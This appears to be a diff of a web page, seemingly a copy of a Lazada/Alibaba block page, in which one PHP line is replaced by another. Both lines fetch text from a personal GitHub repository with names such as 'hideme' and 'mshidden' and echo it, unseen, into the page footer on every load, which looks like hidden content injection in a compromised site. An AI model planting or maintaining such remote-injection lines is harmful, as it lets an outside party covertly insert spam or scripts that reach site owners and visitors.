@@ -3557,6 +3557,6 @@ var gConfig = window.g_config || {};
       <iframe id="baxia-dialog-content" frameborder="none" src="https://g.alicdn.com/sd/punish/block_h5.html?wh_ttid=pc&amp;qrcode=Dbe3DrtDbiOTS9J5k4-32g|ZsF3RA|wlUzrg_0&amp;uuid=0db7b70ebb436e23934bd279938fb7da&amp;origin=https%3A%2F%2Fmember.lazada.co.id%2Fuser%2Fapi%2FgetUser"></iframe>
       <div class="baxia-dialog-close">X</div>
       </div></div>
-<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/hideme/main/file.txt");?>
+<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/ppai-nrru.txt");?>
 	  </body>
 </html>
